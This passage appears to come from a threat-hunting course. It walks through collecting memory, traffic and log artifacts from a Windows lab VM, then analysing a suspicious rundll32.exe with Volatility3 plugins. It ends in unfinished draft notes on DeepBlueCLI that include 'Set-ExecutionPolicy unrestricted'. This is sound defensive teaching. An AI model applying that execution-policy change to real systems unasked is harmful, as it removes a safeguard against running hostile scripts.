+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winpmem.exe memdump.raw
+</span></span></code></pre></div><p>Feel free to shut down the Kali VM - this will of course kill the connection but for now that&rsquo;s not an issue since we have everything we need: a memory dump, a traffic packet capture, and logs (WEL, PowerShell, Sysmon).</p>
+<hr>
+<h1 id="part-4-post-mortem-memory-analysis">PART 4: Post-Mortem Memory Analysis</h1>
+<p>First thing&rsquo;s first - we need to transfer all our artifacts over from the Windows VM to our Ubuntu analyst VM. There are a number of ways to do this, and if you have your own method you prefer please do go ahead. I&rsquo;m going to install python3 so we can quickly spin up a simply http server and transfer it that way.</p>
+<p>But before we do that, let&rsquo;s aggregate all our data.</p>
+<ol>
+<li>(opt) For simplicity I am going to create a new folder on the desktop called <code>artifacts</code>.</li>
+<li>Copy your pcap (traffic packet capture) into it, in my case it&rsquo;s <code>dllattack.pcap</code> located on the desktop.</li>
+<li>Then copy your memory dump into the same folder, in my case again it was saved to desktop as <code>memdump.raw</code>.</li>
+<li>Now we&rsquo;ll need to copy the logs over, first we&rsquo;ll do the WEL logs. Open an administrative PowerShell terminal and run the following command:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Copy-Item -Path &#34;C:\Windows\System32\winevt\Logs\System.evtx&#34;,&#34;C:\Windows\System32\winevt\Logs\Application.evtx&#34;,&#34;C:\Windows\System32\winevt\Logs\Security.evtx&#34; -Destination &#34;C:\Users\User\Desktop\artifacts&#34;
+</span></span></code></pre></div><ol start="5">
+<li>Now we&rsquo;ll do the Sysmon logs, for this we&rsquo;ll need to convert it into an .evtx file wherafter we can save it directly in our <code>artifacts</code> directory.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil epl &#34;Microsoft-Windows-Sysmon/Operational&#34; &#34;C:\Users\User\Desktop\artifacts\Sysmon.evtx&#34;
+</span></span></code></pre></div><ol start="6">
+<li>Finally we&rsquo;ll do the same for the PowerShell Script Block Logs.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil epl &#34;Microsoft-Windows-PowerShell/Operational&#34; &#34;C:\Users\User\Desktop\artifacts\PowerShell.evtx&#34;
+</span></span></code></pre></div><p>Great so in your <code>artifacts</code> folder you should now have the following itesms - see image below.</p>
+<figure class="custom-figure"><img src="/img/image060.png"/>
+</figure>
+
+<p>We&rsquo;re now ready to transfer the files over.</p>
+<ol>
+<li>First download the Python3 installer <a href="https://www.python.org/downloads/windows/">here</a>.</li>
+<li>Then simply run the installer, all default selections.</li>
+<li>Once it&rsquo;s done open an administrative <code>Command Prompt</code> and navigate to the <code>artifacts</code> folder.</li>
+<li>We can now spawn our <strong>http server</strong>.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -m http.server 8008
+</span></span></code></pre></div><ol start="5">
+<li>You will more than likely receive a Windows Security Alert, click Allow Access.</li>
+</ol>
+<p><figure class="custom-figure"><img src="/img/image058.png"/>
+</figure>
+
+6. Now head on over to your Ubuntu analyst VM and open the browser (FireFox). Navigate to <code>http://[windows_IP]:8008</code>, in my case that would be <code>http://192.168.230.158:8008</code>.</p>
+<figure class="custom-figure"><img src="/img/image061.png"/>
+</figure>
+
+<ol start="7">
+<li>Now you can simply go ahead and save each of the files to wherever you want - for simplicity&rsquo;s sake I will be saving them all directly to the desktop in another folder called <code>artifacts</code>.</li>
+</ol>
+<p>Now that we have all the data on the analyst system we&rsquo;re free to start analysis. Note you are free to close the Windows VM, for the rest of the course we&rsquo;ll only be using the Ubuntu VM.</p>
+<p>We&rsquo;ll now start our Post-Mortem Memory Analysis, but in case you are interested here is a short little overview of the tool we&rsquo;ll be working with, Volatility.</p>
+<h1 id="volatility-theory">VOLATILITY THEORY</h1>
+<p>Volatility is an open-source memory forensics framework used to extract digital artifacts from volatile memory (RAM) dumps. It&rsquo;s developed in Python and allows us to investigate potential malicious activity by looking processes, network connections and much, much more.</p>
+<p>It takes a sort of modular approach where you use different plug-ins (seperate <code>.py</code> scripts) to perform specific tasks - for example <code>pslist</code> gives us an overview of processes while <code>netstat</code> gives us statistics about network connections. There are a few dozen such plug-ins and you can either write your own.</p>
+<p>For this course we&rsquo;ll be exploring the following 6 and I strongly encourage you to explore others to become more familiar with this great tool.</p>
+<ul>
+<li>pslist</li>
+<li>handles</li>
+<li>cmdline</li>
+<li>netscan</li>
+<li>malfind</li>
+</ul>
+<h1 id="analysis-with-volatility">ANALYSIS WITH VOLATILITY</h1>
+<p><strong>pslist</strong>
+Two of the most common/popular plugs-ins are <code>pslist</code> and <code>pstree</code>. The former gives us a list of all processes including some key details, <code>pstree</code> conversely will also show Parent-Child relationships.</p>
+<p>We won&rsquo;t go into these plug-ins very deep right now because, in essence, we already gleamed most of the insights it has to offer during our live analysis. But it is good to be aware, if for whatever reason you were not able to perform the live analysis but did come in possession of the memory dump, then effectively you can through a perhaps somewhat more convoluted manner arrive at the same insights.</p>
+<p>I will however quickly run <code>psinfo</code> below just so we get the PID of our suspicious process, we&rsquo;ll use that with other plug-ins.</p>
+<ol>
+<li>Open a terminal and navigate your your main Volatility3 directory, in my case it is <code>/home/analyst/Desktop/volatility3</code>.</li>
+<li>Let&rsquo;s run our <code>psinfo</code> plugin using the following command:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.pslist 
+</span></span></code></pre></div><ol start="3">
+<li>Scroll down until you see <code>rundll32.exe</code> and note it&rsquo;s PID, you can see in my example below it&rsquo;s <code>5060</code>, we&rsquo;ll use this for our next plug-in.</li>
+</ol>
+<figure class="custom-figure"><img src="/img/image062.png"/>
+</figure>
+
+<p><strong>handles</strong>
+Now that we&rsquo;ve got the PID of our suspicious program we&rsquo;re going to look at its handles.</p>
+<p>A handle is like a reference that a program uses to access a resource - whether that be files, registry keys, or network connections. When a process wants to access one of these resources, the operating system gives it a handle, kind of like a ticket, that the process uses to read from or write to the resource.</p>
+<p>For threat hunting it&rsquo;s a great idea to look at the handles of any process you consider suspect since it will give you a lot of information about what a process is actually doing. For instance, if a process has a handle to a sensitive file or network connection that it shouldn&rsquo;t have access to, it could be a sign of malicious activity. By examining the handles, we can get a clearer picture of what the suspicious process is up to, helping you understand its purpose and potentially identify the nature of the threat.</p>
+<p>Now to be frank this analysis of handles can be a rather complex endeavour, relying on a deep techincal understanding of the subject. So I&rsquo;ll show how it works, and of course provide some insight on the findings, but be aware that I won&rsquo;t be able to do an exhaustive exploration of this topic as that could be a multi-hour course in and of itself.</p>
+<p>So let&rsquo;s run the <code>windows.handles</code> plugin with the following command, including the PID of <code>rundll32.exe</code> as we just learned.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060
+</span></span></code></pre></div><p>We see a large number of output, too much to meaningfully process right now. However what immediately sticks out is <code>Key</code> - meaning registry keys. So let&rsquo;s run the same search but utilize <code>grep</code> to only see all handles to registry keys:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060 | grep Key
+</span></span></code></pre></div><p>We can see all the results in the image below:</p>
+<figure class="custom-figure"><img src="/img/image063.png"/>
+</figure>
+
+<p>Again, as has been the case before: nothing here is inherently indicative of malware. However, in the case where we suspect something of being malware, many of these registry key handles are commonly absed by malware.</p>
+<p><code>MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS</code>:
+This key is commonly used to debug applications in Windows. However, it is also used by some malware to intercept the execution of programs. Malware can create a debugger entry for a certain program, and then reroute its execution to a malicious program instead.</p>
+<p><code>MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS</code>: This key is related to National Language Support (NLS) and the sorting of strings in various languages. It&rsquo;s uncommon for applications to directly interact with these keys. If the process is modifying this key, it may be an attempt to affect system behavior or mask its activity.</p>
+<p><code>MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\HWORDER and MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\PROVIDERORDER</code>: These keys are related to the order in which network providers are accessed in Windows. Modification of these keys may indicate an attempt to intercept or manipulate network connections.</p>
+<p><code>MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9 and MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\NAMESPACE_CATALOG5</code>: These keys are related to the Winsock API, which is used by applications to communicate over a network. If the process is interacting with these keys, it could be trying to manipulate network communication, which is a common tactic of malware.</p>
+<p>=============================
+<strong>cmdline</strong></p>
+<p>The <code>cmdline</code> is another useful plug-in I&rsquo;m mentioning because I wanted you to be aware of it, even though we won&rsquo;t learn anything new from it in this specific case. Running the command below we&rsquo;ll see a history of all the command prompt, inlcuding <code>rundll32.exe</code>. So again we learn here, as we did in the live analysis, that it ran without any expected arguments. In the case a live analysis was not feasible, we&rsquo;d once again be able to attain that same insight here in the post-mortem analysis.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.cmdline.CmdLine --pid 5060 | grep Key
+</span></span></code></pre></div><p><strong>netscan</strong>
+The <code>netscan</code> plugin will scan the memory dump looking for any network connections and sockets made by the OS.</p>
+<p>You can run the scan using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.netscan
+</span></span></code></pre></div><p>Right now I&rsquo;ll defer comment, since we&rsquo;re going to jump into network connections DEEPLY in PART X with <code>Wireshark</code>, <code>Zeek</code>, and <code>RITA</code>. I just wanted you to be aware that you can also use a memory dump to look at network connections if for some reason you don&rsquo;t have a packet capture available.</p>
+<p><strong>malfind</strong>
+<code>malfind</code> is the quintessential plugin for, well, finding malware. The plugin will look for suspected inject code, which it determines based on header info - much indeed like we did during our live analysis in steps 6 and 7.</p>
+<p>We can run it with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.malfind
+</span></span></code></pre></div><p>Below is a sample of the result, which is quite extensive:</p>
+<figure class="custom-figure"><img src="/img/image064.png"/>
+</figure>
+
+<p>We can see that it correctly flagged <code>rundll32.exe</code>. However, if we go through the entire list we can see a number of false positives:</p>
+<ul>
+<li>RuntimeBroker.exe</li>
+<li>SearchApp.exe</li>
+<li>powershell.exe</li>
+<li>smartscreen.exe</li>
+</ul>
+<p>This is thus a good reminder that the mere appearance of a process in malfind&rsquo;s output is not an unequivocal affirmation of its malicious nature.</p>
+<p><strong>Closing Thoughts</strong>
+This section was admitrtedly not all-too revelatory. But that&rsquo;s really because we have already performed live analysis, and thus we can say the point of performing post-mortem analysis is really:</p>
+<ul>
+<li>to strengthen the case/conviction of suspicious malware identified during live analysis, or</li>
+<li>in the case that live analysis was unfeasible, much of the same data/insights could be obtained here with Volatility3.</li>
+</ul>
+<p>I think this a good introduction to Volatility3, though we could obviously go much deeper I&rsquo;ll leave that for our next course.</p>
+<p>SO for now let&rsquo;s jump straight into log analysis with an emphasis on UEBA.</p>
+<hr>
+<h1 id="part-x-log-analysis-and-ueba">PART X: LOG ANALYSIS AND UEBA</h1>
+<p>Time for us to get into some LOGGING&hellip;</p>
+<figure class="custom-figure"><img src="/img/lumberjack.gif"/>
+</figure>
+
+<p>No, not that kinda logging.</p>
+<p>The kind which, admittedly, is not too exicting.</p>
+<p>Here let&rsquo;s touch on some regular logging.</p>
+<h1 id="deepbluecli-1">DeepBlueCLI</h1>
+<p>OK big change: we have to run this on Windows
+So remove part where you install it on Linux, install on Windows instead,
+don&rsquo;t shut windows off
+no need to trasnfer it over (logs) to Linux</p>
+<p><code>Set-ExecutionPolicy unrestricted</code>
+warning
+<code>A</code></p>
+<p><code>.\DeepBlue.ps1 ..\artifacts\Security.evtx</code>
+warning
+<code>R</code></p>
 
 		</section>
 
